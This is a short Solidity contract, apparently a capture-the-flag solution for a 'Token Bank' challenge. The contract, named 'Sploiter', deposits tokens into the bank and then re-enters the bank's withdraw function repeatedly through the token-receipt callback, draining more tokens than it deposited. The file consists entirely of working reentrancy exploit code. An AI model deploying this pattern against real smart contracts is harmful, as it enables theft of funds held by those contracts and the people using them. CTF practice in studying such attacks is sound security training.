import "./token-bank.sol";


contract Sploiter is ITokenReceiver {
    uint256 public counter = 0;
    uint256 public maxCounter = 0;
    TokenBankChallenge bank;
    SimpleERC223Token token;
    
    function tokenFallback(address from, uint256 value, bytes data) external {
        // 
        emit ThankYou(from, value, data);
        play();
    }
    
    function setup(uint256 _maxCounter, address _bank, address _token) public {
        maxCounter = _maxCounter;
        counter = 0;
        bank = TokenBankChallenge(_bank);
        
        // Send owned tokens to the bank
        token = SimpleERC223Token(_token);
        token.transfer(_bank, 500000 * 10**18);
    }
    
    function play() public {
        counter += 1;
        if (counter <= maxCounter) {
            bank.withdraw(500000 * 10**18); 
        }
    }
    
    event ThankYou(address from, uint256 value, bytes data);
}